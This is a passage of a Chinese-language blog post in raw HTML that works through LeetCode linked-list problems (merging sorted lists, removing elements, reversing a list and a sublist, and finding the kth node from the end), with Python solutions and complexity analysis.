class="token punctuation">.</span>mergeTwoLists<span class="token punctuation">(</span>l1<span class="token punctuation">.</span>next<span class="token punctuation">,</span>l2<span class="token punctuation">)</span>            <span class="token keyword">return</span> l1<span class="token comment" spellcheck="true">#为啥要返回？因为递归的依次返回上级的时候，需要用这个较小节点来赋值 x.next。</span>        <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#l2的当前头节点值更小，所以只需比较l2的下一个和l1头节点</span>            l2<span class="token punctuation">.</span>next<span class="token operator">=</span>self<span class="token punctuation">.</span>mergeTwoLists<span class="token punctuation">(</span>l1<span class="token punctuation">,</span>l2<span class="token punctuation">.</span>next<span class="token punctuation">)</span>            <span class="token keyword">return</span> l2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实递归就是程序内部维护了一个栈。这个题就是每次都把最小值压入栈，最后出栈的时候，将所有数连在一起就可以了。说白了，就是用一个栈维护了顺序。最后的连接，当然是小的连小的，所以l1 小，就连到 l1,l2 小就连到 l2，最后先返回的，就是最小的头结点。 </p><p><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/solution/hua-jie-suan-fa-21-he-bing-liang-ge-you-xu-lian-bi/">图解示例：</a></p><p><img src="/2020/05/07/leetcode-list/1625557103850.png" alt="1625557103850"><img src="/2020/05/07/leetcode-list/1625557119525.png" alt="1625557119525"></p><p><img src="/2020/05/07/leetcode-list/1625557137103.png" alt="1625557137103"></p><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>如何计算递归的时间复杂度和空间复杂度呢？ 力扣对此进行了 <a href="https://leetcode-cn.com/explore/orignial/card/recursion-i/259/complexity-analysis/1223/">详细介绍</a> ，其中时间复杂度可以这样计算：</p><p>给出一个递归算法，其时间复杂度O(T) 通常是递归调用的数量（记作R） 和计算的时间复杂度的乘积（表示为 O(s)）的乘积：O(T)=R∗O(s)</p><p><strong>时间复杂度：</strong>O(m+n)。m，n为l1和l2的元素个数。递归函数每次去掉一个元素，直到两个链表都为空，因此需要调用 R=O(m + n)次。而在递归函数中我们只进行了 next 指针的赋值操作，复杂度为 O(1)，故递归的总时间复杂度为 O(T) =R∗O(1)=O(m+n) 。</p><p><strong>空间复杂度：</strong>O(m+n)</p><p>对于递归调用 self.mergeTwoLists()，当它遇到终止条件准备回溯时，已经递归调用了 m+n 次，使用了 m+n 个栈帧，故最后的空间复杂度为 O(m+n)。</p><h3 id="方法二：迭代法"><a href="#方法二：迭代法" class="headerlink" title="方法二：迭代法"></a>方法二：迭代法</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>​    首先，我们设定一个哨兵节点 prehead ，这可以在最后让我们比较容易地返回合并后的链表。我们维护一个 prev 指针，我们需要做的是调整它的 next 指针。然后，我们重复以下过程，直到 l1 或者 l2 指向了 null ：如果 l1 当前节点的值小于等于 l2 ，我们就把 l1 当前的节点接在 prev 节点的后面同时将 l1 指针往后移一位。否则，我们对 l2 做同样的操作。不管我们将哪一个元素接在了后面，我们都需要把 prev 向后移一位。</p><p>​    在循环终止的时候， l1 和 l2 至多有一个是非空的。由于输入的两个链表都是有序的，所以不管哪个链表是非空的，它包含的所有元素都比前面已经合并链表中的所有元素都要大。这意味着我们只需要简单地将非空链表接在合并链表的后面，并返回合并链表即可。</p><p><img src="/2020/05/07/leetcode-list/1625712766557.png" alt="1625712766557"></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Definition for singly-linked list.</span><span class="token comment" spellcheck="true"># class ListNode(object):</span><span class="token comment" spellcheck="true">#     def __init__(self, val=0, next=None):</span><span class="token comment" spellcheck="true">#         self.val = val</span><span class="token comment" spellcheck="true">#         self.next = next</span><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> l1<span class="token punctuation">,</span> l2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type l1: ListNode        :type l2: ListNode        :rtype: ListNode        """</span>        prehead<span class="token operator">=</span>ListNode<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        prev<span class="token operator">=</span>prehead        <span class="token keyword">while</span> l1 <span class="token operator">and</span> l2<span class="token punctuation">:</span>            <span class="token keyword">if</span> l1<span class="token punctuation">.</span>val<span class="token operator">&lt;=</span> l2<span class="token punctuation">.</span>val<span class="token punctuation">:</span>                prev<span class="token punctuation">.</span>next<span class="token operator">=</span>l1                l1<span class="token operator">=</span>l1<span class="token punctuation">.</span>next            <span class="token keyword">else</span><span class="token punctuation">:</span>                prev<span class="token punctuation">.</span>next<span class="token operator">=</span>l2                l2<span class="token operator">=</span>l2<span class="token punctuation">.</span>next            prev<span class="token operator">=</span>prev<span class="token punctuation">.</span>next        <span class="token comment" spellcheck="true"># 合并后 l1 和 l2 最多只有一个还未被合并完，我们直接将链表末尾指向未合并完的链表即可</span>        prev<span class="token punctuation">.</span>next <span class="token operator">=</span> l1 <span class="token keyword">if</span> l1 <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token keyword">else</span> l2        <span class="token keyword">return</span> prehead<span class="token punctuation">.</span>next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>时间复杂度：O(n + m)，其中 n 和 m 分别为两个链表的长度。因为每次循环迭代中，l1 和 l2 只有一个元素会被放进合并链表中， 因此 while 循环的次数不会超过两个链表的长度之和。所有其他操作的时间复杂度都是常数级别的，因此总的时间复杂度为 O(n+m)。</p><p>空间复杂度：O(1)。我们只需要常数的空间存放若干变量。</p><h2 id="3-leetcode203-移除链表元素"><a href="#3-leetcode203-移除链表元素" class="headerlink" title="3 leetcode203.移除链表元素"></a>3 <a href="https://leetcode-cn.com/problems/remove-linked-list-elements/">leetcode203.移除链表元素</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个链表的头节点 <code>head</code> 和一个整数 <code>val</code> ，请你删除链表中所有满足 <code>Node.val == val</code> 的节点，并返回 <strong>新的头节点</strong> 。 </p><p>示例1</p><p>输入：head = [1,2,6,3,4,5,6], val = 6<br>输出：[1,2,3,4,5]</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>先设置一个虚拟头节点，dummyHead ，并指向头节点， dummyHead.next = head。</li><li>建立一个节点 cur 用来表示当前节点，cur始终指向要考虑的节点的前一个位置。如果 cur 的下一个节点不为空且下一个节点的节点值等于给定的 val ，则需要删除下一个节点的操作也是定式，即 cur.next = cur.next.next。如果 cur 的下一个节点的节点值不等于给定的 val，则保留下一个节点，将 cur 移动到下一个节点即可。</li><li>最终返回 dummyHead.next 即为删除操作后的头节点。</li></ol><p><img src="/2020/05/07/leetcode-list/1625801074780.png" alt="1625801074780"></p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">removeElements</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :type val: int        :rtype: ListNode        """</span>        dummy<span class="token operator">=</span>ListNode<span class="token punctuation">(</span><span class="token punctuation">)</span>        dummy<span class="token punctuation">.</span>next<span class="token operator">=</span>head<span class="token comment" spellcheck="true">#记录头节点位置</span>        p<span class="token operator">=</span>dummy<span class="token comment" spellcheck="true">#遍历该链表指针</span>        <span class="token keyword">while</span> p <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            <span class="token keyword">if</span> p<span class="token punctuation">.</span>next <span class="token operator">and</span> p<span class="token punctuation">.</span>next<span class="token punctuation">.</span>val<span class="token operator">==</span>val<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等则移除该元素</span>                p<span class="token punctuation">.</span>next<span class="token operator">=</span>p<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#移除该元素</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#否则继续往下找</span>                p<span class="token operator">=</span>p<span class="token punctuation">.</span>next        <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>时间复杂度：O(n)，其中 n 是链表的长度。需要遍历链表一次。</li><li>空间复杂度：O(1)。</li></ul><h2 id="4-leetcode206-反转链表"><a href="#4-leetcode206-反转链表" class="headerlink" title="4 leetcode206.反转链表"></a>4 <a href="https://leetcode-cn.com/problems/reverse-linked-list/">leetcode206.反转链表</a></h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。 </p><p>示例1</p><pre><code>输入：head = [1,2,3,4,5]输出：[5,4,3,2,1]</code></pre><h3 id="方法一：双指针迭代"><a href="#方法一：双指针迭代" class="headerlink" title="方法一：双指针迭代"></a>方法一：双指针迭代</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="https://leetcode-cn.com/problems/reverse-linked-list/solution/dong-hua-yan-shi-206-fan-zhuan-lian-biao-by-user74/">我们可以申请两个指针</a>，</p><p>第一个指针叫 pre，最初是指向 null 的。<br>第二个指针 cur 指向 head，然后不断遍历 cur。<br>每次迭代到 cur，都将 cur 的 next 指向 pre，</p><p>然后 pre 和 cur 前进一位。<br>都迭代完了(cur 变成 null 了)，pre 就是最后一个节点了。</p><p>  <img src="/2020/05/07/leetcode-list/diedai.gif" alt="diedai"></p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Definition for singly-linked list.</span><span class="token comment" spellcheck="true"># class ListNode(object):</span><span class="token comment" spellcheck="true">#     def __init__(self, val=0, next=None):</span><span class="token comment" spellcheck="true">#         self.val = val</span><span class="token comment" spellcheck="true">#         self.next = next</span><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :rtype: ListNode        """</span>        pre<span class="token operator">=</span>None<span class="token comment" spellcheck="true">#注意这里不要写成 pre=ListNode()</span>        curr<span class="token operator">=</span>head        <span class="token keyword">while</span> curr<span class="token punctuation">:</span>            next<span class="token operator">=</span>curr<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#保存当前节点的下一个值</span>            curr<span class="token punctuation">.</span>next<span class="token operator">=</span>pre<span class="token comment" spellcheck="true"># 反转前节点curr反向指前一个元素pre</span>            <span class="token comment" spellcheck="true">##curr和pre后移</span>            pre<span class="token operator">=</span>curr            curr<span class="token operator">=</span>next        <span class="token keyword">return</span> pre<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-3"><a href="#复杂度分析-3" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li>时间复杂度：O(n)，其中 n是链表的长度。需要遍历链表一次。</li><li>空间复杂度：O(1)。</li></ul><h3 id="方法二：递归法"><a href="#方法二：递归法" class="headerlink" title="方法二：递归法"></a>方法二：递归法</h3><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>递归版本稍微复杂一些，其关键在于反向工作。假设链表的其余部分已经被反转，现在应该如何反转它前面的部分？</p><p>假设链表为：</p><p><img src="/2020/05/07/leetcode-list/1625627248059.png" alt="1625627248059"></p><p>若从节点 n{k+1} 到 n{m}已经被反转，而我们正处于n{k}</p><p><img src="/2020/05/07/leetcode-list/1625627333611.png" alt="1625627333611"></p><p>我们希望 n{k+1}的下一个节点指向n{k} 。</p><p>所以，nk.next.next=nk</p><p>需要注意的是 nk的下一个节点必须指向∅。如果忽略了这一点，链表中可能会产生环。<a href="https://leetcode-cn.com/problems/reverse-linked-list/solution/dong-hua-yan-shi-206-fan-zhuan-lian-biao-by-user74/">详细图解参考</a></p><p><img src="/2020/05/07/leetcode-list/dacd1bf55dec5c8b38d0904f26e472e2024fc8bee4ea46e3aa676f340ba1eb9d.gif" alt="dacd1bf55dec5c8b38d0904f26e472e2024fc8bee4ea46e3aa676f340ba1eb9d"></p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :rtype: ListNode        """</span>        <span class="token keyword">if</span> head <span class="token keyword">is</span> None <span class="token operator">or</span> head<span class="token punctuation">.</span>next <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">return</span> head        <span class="token comment" spellcheck="true"># 这里的cur就是最后一个节点</span>        cur<span class="token operator">=</span>self<span class="token punctuation">.</span>reverseList<span class="token punctuation">(</span>head<span class="token punctuation">.</span>next<span class="token punctuation">)</span>        head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token operator">=</span>head <span class="token comment" spellcheck="true">#局部反转 n&amp;#123;k+1&amp;#125;指向nk</span>        head<span class="token punctuation">.</span>next<span class="token operator">=</span>None <span class="token comment" spellcheck="true">#nk--->n&amp;#123;k+1&amp;#125;断掉</span>        <span class="token comment" spellcheck="true"># 每层递归函数都返回cur，也就是最后一个节点</span>        <span class="token keyword">return</span> cur<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-4"><a href="#复杂度分析-4" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><strong>时间复杂度：</strong>O(n)，其中 n是链表的长度。需要对链表的每个节点进行反转操作。</p><p><strong>空间复杂度：</strong>O(n)，其中 n 是链表的长度。空间复杂度主要取决于递归调用的栈空间，最多为 n 层</p><h2 id="5-leetcode-92-反转链表-II"><a href="#5-leetcode-92-反转链表-II" class="headerlink" title="5 leetcode 92 反转链表 II"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list-ii/">5 leetcode 92 反转链表 II</a></h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你单链表的头指针 head 和两个整数 left 和 right ，其中 left &lt;= right 。请你反转从位置 left 到位置 right 的链表节点，返回 反转后的链表 。</p><p>示例1</p><pre><code>输入：head = [1,2,3,4,5], left = 2, right = 4输出：[1,4,3,2,5]</code></pre><h3 id="方法一：穿针引线"><a href="#方法一：穿针引线" class="headerlink" title="方法一：穿针引线"></a>方法一：穿针引线</h3><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>首先还需要记录 <code>left</code> 的前一个节点pre，和 <code>right</code> 的后一个节点succ。如图所示： </p><p>第 1 步：先将待反转的区域反转；<br>第 2 步：把 pre 的 next 指针指向反转以后的链表头节点，把反转以后的链表的尾节点的 next 指针指向 succ。</p><p><img src="/2020/05/07/leetcode-list/1625642715483.png" alt="1625642715483"></p><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Definition for singly-linked list.</span><span class="token comment" spellcheck="true"># class ListNode(object):</span><span class="token comment" spellcheck="true">#     def __init__(self, val=0, next=None):</span><span class="token comment" spellcheck="true">#         self.val = val</span><span class="token comment" spellcheck="true">#         self.next = next</span><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">reverseBetween</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#############第 206 题，反转链表####</span>        <span class="token keyword">def</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">:</span>            pre<span class="token operator">=</span>None            curr<span class="token operator">=</span>head            <span class="token keyword">while</span> curr <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>                next<span class="token operator">=</span>curr<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#保存当前节点的下一个值</span>                curr<span class="token punctuation">.</span>next<span class="token operator">=</span>pre<span class="token comment" spellcheck="true"># 反转  当前节点curr反向指前一个元素pre</span>                <span class="token comment" spellcheck="true">##curr和pre后移</span>                pre<span class="token operator">=</span>curr                curr<span class="token operator">=</span>next        <span class="token comment" spellcheck="true">#########################</span>        dummy_node<span class="token operator">=</span>ListNode<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        dummy_node<span class="token punctuation">.</span>next<span class="token operator">=</span>head<span class="token comment" spellcheck="true">#虚拟头节点指向原有头节点had</span>        pre<span class="token operator">=</span>dummy_node<span class="token comment" spellcheck="true">#初始位置为虚拟节点</span>        <span class="token comment" spellcheck="true"># 第 1 步：找到left的前一个节点，所以需要从虚拟节点dummy处走left-1步</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>left<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            pre<span class="token operator">=</span>pre<span class="token punctuation">.</span>next        right_node<span class="token operator">=</span>pre        <span class="token comment" spellcheck="true"># 第 2 步：找到right节点，因此需要从pre再走right-left+1步</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            right_node<span class="token operator">=</span>right_node<span class="token punctuation">.</span>next        <span class="token comment" spellcheck="true"># 第 3 步：切断出一个[left,right]子链表（截取链表）</span>        left_node<span class="token operator">=</span>pre<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#left节点</span>        succ<span class="token operator">=</span>right_node<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#找到right节点的后一节点</span>        <span class="token comment" spellcheck="true">## # 注意：切断链接</span>        pre<span class="token punctuation">.</span>next<span class="token operator">=</span>None        right_node<span class="token punctuation">.</span>next<span class="token operator">=</span>None        <span class="token comment" spellcheck="true">#第 4 步：同第 206 题，反转链表的子区间 [left,right]为[right,left]</span>        reverseList<span class="token punctuation">(</span>left_node<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#第5步：拼接到原来的链表中</span>        pre<span class="token punctuation">.</span>next<span class="token operator">=</span>right_node        left_node<span class="token punctuation">.</span>next<span class="token operator">=</span>succ        <span class="token keyword">return</span> dummy_node<span class="token punctuation">.</span>next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-5"><a href="#复杂度分析-5" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li>时间复杂度：O(N)，其中 N是链表总节点数。最坏情况下，需要遍历整个链表，这里需要遍历2次链表，其中找到pre,left,right,succ的位置需要遍历一遍；其次翻转链表最坏的情况需要一次。</li><li>空间复杂度：O(1)。只使用到常数个变量。</li></ul><h3 id="方法二：一次遍历「穿针引线」反转链表（头插法）"><a href="#方法二：一次遍历「穿针引线」反转链表（头插法）" class="headerlink" title="方法二：一次遍历「穿针引线」反转链表（头插法）"></a>方法二：一次遍历「穿针引线」反转链表（头插法）</h3><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/2020/05/07/leetcode-list/1625642959650.png" alt="1625642959650"></p><p>整体思想是：在需要反转的区间里，每遍历到一个节点，让这个新节点来到反转部分的起始位置。下面的图展示了整个流程。</p><p><img src="/2020/05/07/leetcode-list/1625642996903.png" alt="1625642996903"></p><p>下面我们具体解释如何实现。使用三个指针变量 pre、curr、next 来记录反转的过程中需要的变量，它们的意义如下：</p><p>curr：指向待反转区域的第一个节点 left；<br>next：永远指向 curr 的下一个节点，循环过程中，curr 变化以后 next 会变化；<br>pre：永远指向待反转区域的第一个节点 left 的前一个节点，在循环过程中不变。</p><p> 第 1 步，我们使用 ①、②、③ 标注「穿针引线」的步骤。 </p><p><img src="/2020/05/07/leetcode-list/1625645210416.png" alt="1625645210416"></p><p>操作步骤：</p><p>先将 curr 的下一个节点记录为 next；<br>执行操作 ①：删除curr的next节点：把 curr 的下一个节点指向 next 的下一个节点；<br>执行操作 ②：插入curr前面–连接后面的curr：把 next 的下一个节点指向 pre 的下一个节点；<br>执行操作 ③：插入curr前面–连接前面的pre,把 pre 的下一个节点指向 next。</p><p> 第 1 步完成以后「拉直」的效果如下： </p><p><img src="/2020/05/07/leetcode-list/1625646935033.png" alt="1625646935033"></p><p>第 2 步，同理。同样需要注意 <strong>「穿针引线」操作的先后顺序</strong>。</p><p><img src="/2020/05/07/leetcode-list/1625646943833.png" alt="1625646943833"></p><p>后面一直重复该步骤即可。</p><h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">reverseBetween</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># ###########方法2 头插入法#需要遍历1次##############</span>        dummy_node<span class="token operator">=</span>ListNode<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        dummy_node<span class="token punctuation">.</span>next<span class="token operator">=</span>head<span class="token comment" spellcheck="true">#虚拟头节点指向原有头节点had</span>        pre<span class="token operator">=</span>dummy_node<span class="token comment" spellcheck="true">#初始位置为虚拟节点</span>        <span class="token comment" spellcheck="true"># 第 1 步：找到left的前一个节点，所以需要从虚拟节点dummy处走left-1步</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>left<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            pre<span class="token operator">=</span>pre<span class="token punctuation">.</span>next        curr <span class="token operator">=</span> pre<span class="token punctuation">.</span>next  <span class="token comment" spellcheck="true"># 第一次为left节点</span>        <span class="token comment" spellcheck="true"># 第 2 步：找到right节点，因此需要从pre再走right-left+1步</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token punctuation">:</span>            next<span class="token operator">=</span>curr<span class="token punctuation">.</span>next            <span class="token comment" spellcheck="true">#####插入到left前面</span>            curr<span class="token punctuation">.</span>next<span class="token operator">=</span>next<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#删除</span>            <span class="token comment" spellcheck="true">##为什么next.next=curr是错的？？</span>            <span class="token comment" spellcheck="true"># 在第一次循环的时候结果是没问题的，但是在第二次循环时current就不再是previous指向的下一个值了，curr会后移一位变成pre.next.next 所以结果就错了。</span>            next<span class="token punctuation">.</span>next<span class="token operator">=</span>pre<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#插入  连接后面的线</span>            pre<span class="token punctuation">.</span>next<span class="token operator">=</span>next<span class="token comment" spellcheck="true">#插入 连接前面的线</span>            <span class="token comment" spellcheck="true">#####为什么移动curr  不需要写curr=curr.next???</span>            <span class="token comment" spellcheck="true">##因为将curr.next插入到curr前面，即pre的后面，插入完成后，curr位置直接后移了一个，curr.next是新的值</span>        <span class="token keyword">return</span> dummy_node<span class="token punctuation">.</span>next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-6"><a href="#复杂度分析-6" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li>时间复杂度：O(N)，其中 N是链表总节点数。最多只遍历了链表一次，就完成了反转。</li><li>空间复杂度：O(1)。只使用到常数个变量。</li></ul><h2 id="6-剑指-Offer-22-链表中倒数第k个节点"><a href="#6-剑指-Offer-22-链表中倒数第k个节点" class="headerlink" title="6 剑指 Offer 22. 链表中倒数第k个节点"></a>6 <a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/">剑指 Offer 22. 链表中倒数第k个节点</a></h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。</p><p>例如，一个链表有 6 个节点，从头节点开始，它们的值依次是 1、2、3、4、5、6。这个链表的倒数第 3 个节点是值为 4 的节点。</p><p> 示例：</p><p>给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k = 2.</p><p>返回链表 4-&gt;5.</p><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>第一时间想到的解法：<br>先遍历统计链表长度，记为 n ；<br>设置一个指针走 (n-k)步，即可找到链表倒数第 k个节点。<br>使用双指针则可以不用统计链表长度。也可想象为一个滑块，维护长度为k的滑块，当滑块的rifht为null，则left就是倒数第k个节点。如下图所示。</p><p><img src="/2020/05/07/leetcode-list/1625649058423.png" alt="1625649058423"></p><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">getKthFromEnd</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :type k: int        :rtype: ListNode        """</span>        left<span class="token operator">=</span>head        right<span class="token operator">=</span>head        <span class="token comment" spellcheck="true">###构造长度为k的滑块</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>            right<span class="token operator">=</span>right<span class="token punctuation">.</span>next        <span class="token keyword">while</span> right <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">##同步向右移动</span>            left<span class="token operator">=</span>left<span class="token punctuation">.</span>next            right<span class="token operator">=</span>right<span class="token punctuation">.</span>next        <span class="token keyword">return</span> left<span class="token comment" spellcheck="true">#返回倒数第k个节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-7"><a href="#复杂度分析-7" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度 O(N) ： N为链表长度；总体看， right走了 N 步， left走了 (N-k)步。<br>空间复杂度 O(1)： 双指针 left, right使用常数大小的额外空间。</p><h2 id="7-leetcode141-环形链表"><a href="#7-leetcode141-环形链表" class="headerlink" title="7 leetcode141. 环形链表"></a>7 <a href="https://leetcode-cn.com/problems/linked-list-cycle/">leetcode141. 环形链表</a></h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" 